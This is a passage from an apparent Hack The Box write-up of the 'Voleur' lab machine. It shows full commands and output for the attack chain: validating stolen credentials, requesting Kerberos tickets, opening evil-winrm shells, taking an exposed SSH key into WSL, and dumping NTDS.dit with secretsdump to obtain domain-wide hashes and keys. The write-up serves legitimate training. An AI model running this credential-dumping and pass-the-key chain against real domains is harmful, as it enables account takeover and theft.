Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : WindowsLive:target=virtualapp/didlogical
Description : PersistedCredential
Unknown     :
Username    : 02xsqpzotltkxgpg
Unknown     :

/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Validated the credential of `jeremy.combs`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ nxc ldap $(pt get rhost) -k -u 'jeremy.combs' -p 'qT3V9pLXyN7W4m'
LDAP        DC.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        DC.voleur.htb   389    DC               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m
```


### 5985 - Winrm

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ creds-set 'jeremy.combs' 'qT3V9pLXyN7W4m'
[+] Password set for user jeremy.combs

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user)".ccache)
/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250708.155831.171a324 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in jeremy.combs.ccache
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get rhost)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jeremy.combs\Documents> whoami
voleur\jeremy.combs
```


## Shell as svc_backup on WSL


### SSH private key for WSL (Third-Line Support)

Since `jeremy.combs` is in `Third-Line Technicians` group, we should be able to access `C:\it\Third-Line Support\`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" get membership "$(pt get user)"

distinguishedName: CN=Users,CN=Builtin,DC=voleur,DC=htb
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users

distinguishedName: CN=Domain Users,CN=Users,DC=voleur,DC=htb
objectSid: S-1-5-21-3927696377-1337352550-2781715495-513
sAMAccountName: Domain Users

distinguishedName: CN=Third-Line Technicians,DC=voleur,DC=htb
objectSid: S-1-5-21-3927696377-1337352550-2781715495-1114
sAMAccountName: Third-Line Technicians
```

There's a ssh private key, note, and `backups` folder in `C:\it\Third-Line Support\`

```bash
*Evil-WinRM* PS C:\Users\jeremy.combs\Documents> ls 'C:\it\Third-Line Support\' -Force -ErrorAction SilentlyContinue | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner                  LastWriteTime        Length FullName
----   -----                  -------------        ------ --------
-a---- BUILTIN\Administrators 1/30/2025 8:07:35 AM    186 C:\it\Third-Line Support\Note.txt.txt
-a---- VOLEUR\svc_backup      1/30/2025 8:10:54 AM   2602 C:\it\Third-Line Support\id_rsa
d-----                        1/30/2025 8:11:29 AM        C:\it\Third-Line Support\Backups
```

The note stated that an `admin` has configured **WSL** in order to use backup tools from linux

```bash
*Evil-WinRM* PS C:\Users\jeremy.combs\Documents> cat 'C:\it\Third-Line Support\Note.txt.txt'
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

`C:\it\Third-Line Support\Backups` could contain juicy data, but we can't access it

```bash
*Evil-WinRM* PS C:\Users\jeremy.combs\Documents> icacls 'C:\it\Third-Line Support\Backups'
icacls.exe : C:\it\Third-Line Support\Backups: Access is denied.
    + CategoryInfo          : NotSpecified: (C:\it\Third-Lin...cess is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Successfully processed 0 files; Failed processing 1 files
```

Remember the SSH service on port `2222` we've discovered from nmap scan? We can try the ssh private key as its owner `svc_backup`. Lets save the ssh private key

```bash
*Evil-WinRM* PS C:\Users\jeremy.combs\Documents> cat 'C:\it\Third-Line Support\id_rsa'
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```


### 2222 - SSH

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ vi loot/svc_backup.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ chmod 600 ./loot/svc_backup.id_rsa
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ ssh -i loot/svc_backup.id_rsa svc_backup@DC.voleur.htb -p 2222
Warning: Permanently added '[dc.voleur.htb]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  9 15:59:21 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   34%       IPv4 address for eth0: 10.129.252.147
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                                                                                              [ OK ]
svc_backup@DC:~$ id
uid=1000(svc_backup) gid=1000(svc_backup) groups=1000(svc_backup),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
```


## Shell as root on WSL


### User in sudoers group

```bash
svc_backup@DC:~$ sudo su
root@DC:/home/svc_backup# id
uid=0(root) gid=0(root) groups=0(root)
```


## Shell as administrator


### Mounted filesystem from host machine

Low hanging fruits to check after getting `root` on containers is to  check mounts and harvest secrets

- `C:\` was mounted into WSL at `/mnt/c`, its owner `svc_backup` (uid `1000`) has read / write access to it

```bash
root@DC:/home/svc_backup# mount
rootfs on / type wslfs (rw,noatime)
none on /dev type tmpfs (rw,noatime,mode=755)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,noatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,noatime)
devpts on /dev/pts type devpts (rw,nosuid,noexec,noatime,gid=5,mode=620)
none on /run type tmpfs (rw,nosuid,noexec,noatime,mode=755)
none on /run/lock type tmpfs (rw,nosuid,nodev,noexec,noatime)
none on /run/shm type tmpfs (rw,nosuid,nodev,noatime)
none on /run/user type tmpfs (rw,nosuid,nodev,noexec,noatime,mode=755)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
C:\ on /mnt/c type drvfs (rw,noatime,uid=1000,gid=1000,case=off)
```

```bash
root@DC:/home/svc_backup# ls -latr /mnt/c
ls: cannot access '/mnt/c/DumpStack.log.tmp': Permission denied
ls: cannot access '/mnt/c/pagefile.sys': Permission denied
ls: /mnt/c/PerfLogs: Permission denied
ls: '/mnt/c/System Volume Information': Permission denied
total 0
-????????? ? ?          ?             ?            ?  pagefile.sys
-????????? ? ?          ?             ?            ?  DumpStack.log.tmp
d--x--x--x 1 svc_backup svc_backup 4096 May  8  2021  PerfLogs
lrwxrwxrwx 1 svc_backup svc_backup   12 Jan 28 20:34 'Documents and Settings' -> /mnt/c/Users
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 28 20:34  Recovery
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  Finance
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  HR
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  IT
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 03:38  Users
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:39 '$Recycle.Bin'
drwxr-xr-x 1 root       root       4096 Jan 30 03:46  ..
d--x--x--x 1 svc_backup svc_backup 4096 Jan 30 03:49 'System Volume Information'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 05:53 'Program Files (x86)'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 06:20 'Program Files'
dr-xr-xr-x 1 svc_backup svc_backup 4096 May 29 15:07  inetpub
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jun  5 12:53  Windows
drwxrwxrwx 1 svc_backup svc_backup 4096 Jun 30 14:08  .
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jun 30 14:08 '$WinREAgent'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jul  9 15:09  ProgramData
```


### Dump NTDS backup file

- `svc_backup` can read backups of **NTDS**, **SYSTEM** and **SECURITY** hives in `C:\it\Third-Line Support\Backups\`

```bash
root@DC:/home/svc_backup# find -L /mnt/c/it -type f -exec ls -lahtr {} + 2>/dev/null
-rwxrwxrwx 1 svc_backup svc_backup  18M Jan 30 03:30 '/mnt/c/it/Third-Line Support/Backups/registry/SYSTEM'
-rwxrwxrwx 1 svc_backup svc_backup  32K Jan 30 03:30 '/mnt/c/it/Third-Line Support/Backups/registry/SECURITY'
-rwxrwxrwx 1 svc_backup svc_backup  16K Jan 30 03:49 '/mnt/c/it/Third-Line Support/Backups/Active Directory/ntds.jfm'
-rwxrwxrwx 1 svc_backup svc_backup  24M Jan 30 03:49 '/mnt/c/it/Third-Line Support/Backups/Active Directory/ntds.dit'
-r-xr-xr-x 1 svc_backup svc_backup  186 Jan 30 08:07 '/mnt/c/it/Third-Line Support/Note.txt.txt'
-r-xr-xr-x 1 svc_backup svc_backup 2.6K Jan 30 08:10 '/mnt/c/it/Third-Line Support/id_rsa'
```

Download them

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ scp -r -i loot/svc_backup.id_rsa -P 2222 svc_backup@DC.voleur.htb:'/mnt/c/it/Third-Line Support/Backups/' ./loot
ntds.dit                                                                                                                                                                       100%   24MB   5.7MB/s   00:04
ntds.jfm                                                                                                                                                                       100%   16KB  25.3KB/s   00:00
SECURITY                                                                                                                                                                       100%   32KB  52.8KB/s   00:00
SYSTEM                                                                                                                                                                         100%   18MB   5.2MB/s   00:03
```

Parse **NTDS**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ secretsdump.py -ntds 'loot/Backups/Active Directory/ntds.dit' -security 'loot/Backups/registry/SECURITY' -system 'loot/Backups/registry/SYSTEM' LOCAL
Impacket v0.13.0.dev0+20250708.155831.171a324 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[...]
[*] Kerberos keys from loot/Backups/Active Directory/ntds.dit
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
[...]
```


### 5985 - Winrm

Request a TGT for `Administrator`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ creds-set 'administrator' 'f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb'
[+] aesKey set for user administrator

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)/$(pt get user)" -aesKey "$(pt get ekey)"; pt set ticket $(realpath "$(pt get user).ccache")
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in administrator.ccache
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get rhost)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
voleur\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
6f08b224ff2a776ecb22f751dcb81b4b
```



# Additional
---

## Post exploitation


### Secrets

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ KRB5CCNAME="$(pt get ticket)" secretsdump.py -k $(pt get dc_fqdn) -outputfile secretsdump -history
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3ca04cd1e646b21a4d87e0e61d959f2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
VOLEUR\DC$:plain_password_hex:7a03c00656cb4a599f624dc8892d97db695db0766ce9cb831f817f476ca33805d1ce2128a948ddc4baf7054a6b3c97995d3b5e04c2437fa403db517628dd70c9be6f24affbc5fac1bb8cb2cec7f91eb24ab4870ef12ab4dd3adf39f7c68f544507258006e20926ae5fd0e0e1b8f86e83ffe2568f82ae65c0a9d709a647adf8664b10b48ef6f88150119ad94043be81690e2ba01ff67b90c705266ab45c30c9f6e024465788ea45f711aade7509bafe498645e1366527696a085c309844c316339185e1f8be9e4ff93116cb8a2e0f70f159b5ce29b9bc943868a263f5b23f31580dbd26d3e85cf66f3ae84b47ec56a134
VOLEUR\DC$:aad3b435b51404eeaad3b435b51404ee:6818b9e11d0cde0f43fb9f812e49807b:::
[*] $MACHINE.ACC_history
VOLEUR\DC$:plain_password_hex:a9c10fdd6af344adf90ceeb80dfbea26207efae1d859da5f3ec3c7a5431ddcc557e673e4a65050c7173532d4342b16a3ceaf973c48c4270a4af3d07aec32650cf16d566da6432592e65ef72fff803ead16f035f814c9e2f2c7b4e043fd0aafcddb7d1236952580287ad0202fa4343512f2f7cb5f90c43700eb63777f41367c229b3da39c3230747479435de03b7942dfeea2ba6b3d717eb6401bd590f333bdc695829a5309ffe45ea199c5cb17e910f098258f2470ac2b17ed403e4431615e3df82ea5dd6700e70c1c5ee04a768ee33bae0b0c8b8854dfc9ca4036569ee6a8b9b91cf45af4542a332d1c063547292b3b
VOLEUR\DC$:aad3b435b51404eeaad3b435b51404ee:37c09f333e78c18f1f3343179afe07e0:::
[*] DefaultPassword
VOLEUR\svc_backup:J7VgZ4N8rTqL3x
[*] DPAPI_SYSTEM
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] DPAPI_SYSTEM_history
dpapi_machinekey:0x5197a2271f41b0d09686dfa4a9409329e0346c05
dpapi_userkey:0xdb03b25a4504573e8e121916e7137910460781e3
[*] NL$KM
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] NL$KM_history
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM_history:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\ryan.naylor_history0:1103:aad3b435b51404eeaad3b435b51404ee:4e68fbc9977b80f87970aae4b1cd0151:::
voleur.htb\ryan.naylor_history1:1103:aad3b435b51404eeaad3b435b51404ee:4e68fbc9977b80f87970aae4b1cd0151:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\marie.bryant_history0:1104:aad3b435b51404eeaad3b435b51404ee:31d08d393fe9f4d4e0fb9869aa0911bb:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\lacey.miller_history0:1105:aad3b435b51404eeaad3b435b51404ee:5997fa41f5516960728d67ee1e28c9b7:::
voleur.htb\lacey.miller_history1:1105:aad3b435b51404eeaad3b435b51404ee:5997fa41f5516960728d67ee1e28c9b7:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_ldap_history0:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_backup_history0:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\svc_iis_history0:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\jeremy.combs_history0:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\jeremy.combs_history1:1109:aad3b435b51404eeaad3b435b51404ee:be0945a53f3446e3eaff774e0123464f:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:046f55328295cb52931f62470f7b1084:::
voleur.htb\svc_winrm_history0:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:6818b9e11d0cde0f43fb9f812e49807b:::
DC$_history0:1000:aad3b435b51404eeaad3b435b51404ee:37c09f333e78c18f1f3343179afe07e0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:27afe96b000d51dff4994cbe7768e6201272b753d591b4a26aea77b6ad411209
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:c87327f223b18ec1527472e47687a204
voleur.htb\svc_winrm:des-cbc-md5:3e70760eea498c25
DC$:aes256-cts-hmac-sha1-96:77eaab4c265d64d5351f5139658f1dbcd5dcae406ca20533610cf012efbacfbe
DC$:aes128-cts-hmac-sha1-96:4b188ba24f843f5b0c9763cef0b74442
DC$:des-cbc-md5:64e05b6d1abff1c8
[*] Cleaning up...
```


### Files

```powershell
[+] C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
ls
$ldapUser = "CN=svc_ldap,OU=Service Accounts,DC=voleur,DC=htb"
$winrmUser = "CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb"
dsacls $winrmUser /G "$ldapUser:WP;servicePrincipalName"
$TaskName = "CleanupScript"`
$ScriptPath = "C:\Users\Administrator\Documents\cleanup.ps1"`
`
